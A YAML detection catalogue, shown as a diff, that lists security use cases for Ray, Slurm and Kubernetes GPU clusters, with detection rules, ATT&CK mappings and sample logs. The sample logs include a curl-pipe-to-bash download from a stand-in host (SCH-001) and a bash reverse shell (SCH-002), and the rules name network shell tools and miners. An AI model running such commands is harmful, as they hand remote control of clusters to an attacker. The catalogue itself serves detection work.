@@ -1,0 +1,163 @@
+category: Workload Scheduling
+code: SCH
+layer: Platform & Pipeline
+scope: Kubernetes scheduler, Slurm, Ray / KubeRay, distributed training orchestrators
+usecases:
+
+  - id: SCH-001
+    name: Unauthenticated Ray Jobs API submission (ShadowRay pattern)
+    severity: Critical
+    description: >-
+      The Ray Jobs API runs arbitrary entrypoints on the cluster and has no authentication by default
+      (CVE-2023-48022). Exposed Ray dashboards were mass-exploited to steal credentials and mine on GPU clusters.
+    log_sources:
+      - Ray dashboard / job manager logs
+      - Ingress or firewall logs for ports 8265 and 10001
+    detection: >-
+      POST /api/jobs/ from IPs outside the approved submitter list, or job entrypoints containing curl, wget, nc,
+      base64, /dev/tcp or "| bash". Any job submission whose source is outside the cluster VPC is Critical.
+    mappings: [T1190, T1059.004, T1496.001]
+    sample_log: |
+      2026-11-12 07:22:31,118 INFO web_log.py:211 -- 203.0.113.66 [12/Nov/2026:07:22:31 +0000] "POST /api/jobs/ HTTP/1.1" 200 251 "-" "python-requests/2.31.0"
+      2026-11-12 07:22:31,204 INFO job_manager.py:578 -- Starting job with submission_id: raysubmit_8Hq2Lk3nWv9xQ1rT
+      {"submission_id":"raysubmit_8Hq2Lk3nWv9xQ1rT","entrypoint":"bash -c 'curl -fsSL http://203.0.113.50/r.sh | bash'","status":"RUNNING","driver_node_id":"6c1e9a2f4b7d8e0c3a5f1b2d9e8c7a6b5f4e3d2c1b0a9f8e7d6c5b4a","runtime_env":{},"metadata":{}}
+
+  - id: SCH-002
+    name: Slurm batch job containing a reverse shell or miner
+    severity: High
+    description: >-
+      A compromised researcher account can use sbatch to run code on hundreds of GPU nodes at once. Storing job
+      scripts in slurmdbd makes the payload visible to the SIEM.
+    log_sources:
+      - slurmctld log
+      - Slurm job scripts (slurmdbd AccountingStoreFlags=job_script)
+    detection: >-
+      Job scripts that match /dev/tcp/, "nc -e", "bash -i", stratum+tcp, xmrig, "curl | bash" or "base64 -d |", or GPU
+      jobs from accounts that have never submitted GPU work.
+    mappings: [T1059.004, T1053]
+    sample_log: |
+      [2026-11-12T08:02:14.118] _slurm_rpc_submit_batch_job: JobId=4412871 InitPrio=4294901759 usec=812
+      [2026-11-12T08:02:15.003] sched: Allocate JobId=4412871 NodeList=gpu-node-[0412-0415] #CPUs=512 Partition=h100-prod
+      # job script from slurmdbd (user=jsmith account=vision)
+      #!/bin/bash
+      #SBATCH --gres=gpu:8 --nodes=4 --time=72:00:00
+      srun --overlap bash -c 'bash -i >& /dev/tcp/203.0.113.50/443 0>&1'
+
+  - id: SCH-003
+    name: Slurm admin level, QOS or GPU limit changed
+    severity: High
+    description: >-
+      Raising a user's AdminLevel, removing GrpTRES GPU limits or granting access to restricted partitions hands out
+      GPU capacity and scheduler control without going through the allocation process.
+    log_sources:
+      - Slurm accounting transactions (sacctmgr list transactions)
+      - slurmdbd log
+    detection: >-
+      Any change to admin_level, any QOS or association change that raises or removes gres/gpu limits, or users added
+      to restricted partitions, by an actor other than the allocation automation or outside a change ticket.
+    mappings: [T1098, T1078.003]
+    sample_log: |2
+                   Time               Action      Actor                          Where                   Info
+      ------------------- -------------------- ---------- ------------------------------ ----------------------
+      2026-11-12T09:10:11         Modify Users       root                (name='jsmith')          admin_level=3
+      2026-11-12T09:11:02  Modify Associations       root (user='jsmith' AND acct='vision') grp_tres='gres/gpu=512'
+
+  - id: SCH-004
+    name: GPU allocation far above baseline, or allocated GPUs left idle
+    severity: Low
+    description: >-
+      A user who suddenly allocates 8x their normal GPU count, or reserves dozens of GPUs that sit idle, is either
+      hoarding scarce capacity or holding it for unauthorized use.
+    log_sources:
+      - Slurm accounting (sacct)
+      - DCGM job statistics
+    detection: >-
+      AllocTRES gres/gpu at 4x or more of the user's 30-day maximum, or allocated GPUs averaging under 5% SM activity
+      for 2 hours, or jobs in partitions or QOS the account is not entitled to.
+    mappings: [T1496.001]
+    sample_log: |
+      JobID     User    Account Partition AllocTRES                                       Elapsed  State
+      ------- ------- -------- --------- ----------------------------------------------- -------- -------
+      4413002  jsmith   vision h100-prod billing=1024,cpu=1024,gres/gpu=64,mem=8T,node=8 06:12:44 RUNNING
+      dcgm-job-stats jobid=4413002 gpus=64 window=2h avg_sm_active=1.8% avg_fb_used_gib=0.4 max_gpu_util=4% user_30d_max_gpus=8
+
+  - id: SCH-005
+    name: Slurm prolog, epilog, slurm.conf or munge key tampering
+    severity: Critical
+    description: >-
+      Prolog and epilog scripts run as root on every node for every job, and the munge key authenticates the whole
+      cluster. Editing either one gives cluster-wide root and lets an attacker forge jobs as any user.
+    log_sources:
+      - Linux auditd (watches on /etc/slurm, /etc/munge)
+      - File integrity monitoring
+    detection: >-
+      Any write to /etc/slurm/*.conf, prolog.d or epilog.d scripts, or /etc/munge/munge.key outside config
+      management, or a read of munge.key by any process other than munged.
+    mappings: [T1546, T1552.004]
+    sample_log: |
+      type=SYSCALL msg=audit(1794478921.330:90551): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd2b1c3e10 a2=241 a3=1b6 items=2 ppid=88120 pid=88133 auid=1042 uid=0 gid=0 euid=0 comm="vim" exe="/usr/bin/vim.basic" key="slurm_conf"
+      type=PATH msg=audit(1794478921.330:90551): item=1 name="/etc/slurm/prolog.d/50-gpu-check.sh" inode=263401 dev=08:02 mode=0100755 ouid=0 ogid=0 nametype=NORMAL
+
+  - id: SCH-006
+    name: Pod bypasses the Kubernetes scheduler onto reserved GPU nodes
+    severity: Medium
+    description: >-
+      Setting spec.nodeName skips the scheduler, quotas and placement policy entirely. Adding tolerations for another
+      tenant's dedicated taint puts a workload onto their reserved GPU nodes.
+    log_sources:
+      - Kubernetes API server audit logs
+    detection: >-
+      Pod create with spec.nodeName set by a non-system identity, or tolerations for dedicated tenant or pool taints
+      from namespaces not mapped to that tenant.
+    mappings: [T1610]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"Request","auditID":"2d3e4f5a-6b7c-4d8e-9f0a-1b2c3d4e5f6a","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/team-vision/pods","verb":"create","user":{"username":"oidc:jsmith@corp.example","groups":["oidc:researchers","system:authenticated"]},"sourceIPs":["10.20.44.118"],"userAgent":"kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46","objectRef":{"resource":"pods","namespace":"team-vision","name":"big-run-0","apiVersion":"v1"},"responseStatus":{"code":201},"requestObject":{"kind":"Pod","spec":{"nodeName":"dgx-b200-r07-n03","tolerations":[{"key":"dedicated","operator":"Equal","value":"tenant-orion","effect":"NoSchedule"}],"containers":[{"name":"train","image":"registry.corp.example/vision/train:2.4","resources":{"limits":{"nvidia.com/gpu":"8"}}}]}},"requestReceivedTimestamp":"2026-11-12T10:30:02.118Z","stageTimestamp":"2026-11-12T10:30:02.151Z"}
+
+  - id: SCH-007
+    name: Ray head exposed through a LoadBalancer or NodePort service
+    severity: High
+    description: >-
+      Exposing the Ray dashboard (8265) or client port (10001) beyond the cluster recreates the ShadowRay exposure,
+      usually because someone wanted to reach the dashboard from a laptop.
+    log_sources:
+      - Kubernetes API server audit logs
+      - Cloud load balancer creation events
+    detection: >-
+      Service create or update of type LoadBalancer or NodePort, or Ingress routes, that select ray.io/node-type=head
+      or expose ports 8265, 10001 or 6379.
+    mappings: [T1133, T1190]
+    sample_log: |
+      {"kind":"Event","apiVersion":"audit.k8s.io/v1","level":"RequestResponse","auditID":"4e5f6a7b-8c9d-4e0f-9a1b-2c3d4e5f6a7b","stage":"ResponseComplete","requestURI":"/api/v1/namespaces/team-nlp/services","verb":"create","user":{"username":"oidc:jsmith@corp.example","groups":["oidc:researchers","system:authenticated"]},"sourceIPs":["10.20.44.118"],"userAgent":"kubectl/v1.31.2 (linux/amd64) kubernetes/5864a46","objectRef":{"resource":"services","namespace":"team-nlp","name":"ray-head-public","apiVersion":"v1"},"responseStatus":{"code":201},"requestObject":{"kind":"Service","spec":{"type":"LoadBalancer","selector":{"ray.io/node-type":"head"},"ports":[{"name":"dashboard","port":8265,"targetPort":8265},{"name":"client","port":10001,"targetPort":10001}]}},"requestReceivedTimestamp":"2026-11-12T11:05:44.201Z","stageTimestamp":"2026-11-12T11:05:44.260Z"}
+
+  - id: SCH-008
+    name: SSH to compute nodes with no running job (pam_slurm_adopt denials)
+    severity: Medium
+    description: >-
+      With pam_slurm_adopt, users can only SSH to nodes where they have a job. A burst of denials across nodes shows
+      someone probing for access or trying to move laterally inside the cluster.
+    log_sources:
+      - Linux sshd / PAM logs on compute nodes
+    detection: >-
+      3 or more "Access denied by pam_slurm_adopt" events for one user across different nodes within 15 minutes, or
+      any denial for a privileged or service account.
+    mappings: [T1021.004]
+    sample_log: |
+      Nov 12 10:01:22 gpu-node-0412 sshd[11322]: pam_slurm_adopt(sshd:account): Access denied by pam_slurm_adopt: you have no active jobs on this node
+      Nov 12 10:01:22 gpu-node-0412 sshd[11322]: fatal: Access denied for user jsmith by PAM account configuration [preauth]
+
+  - id: SCH-009
+    name: Long-lived Slurm REST API token issued
+    severity: Medium
+    description: >-
+      slurmrestd accepts JWTs. A token issued for another user, or with a lifespan of months, is a standing credential
+      that can submit jobs to every partition that user can reach.
+    log_sources:
+      - slurmctld log (auth/jwt)
+      - slurmrestd access logs
+    detection: >-
+      Token generation where the lifespan exceeds policy (for example 24 hours) or the token is issued for a username
+      other than the caller, and slurmrestd use of those tokens from unexpected IPs.
+    mappings: [T1550.001]
+    sample_log: |
+      [2026-11-12T11:40:02.551] auth/jwt: auth_p_token_generate: created token for svc-pipeline for 31536000 seconds
+      [2026-11-12T11:40:02.552] _slurm_rpc_auth_token: token requested by uid=1042 (jsmith) for username=svc-pipeline lifespan=31536000
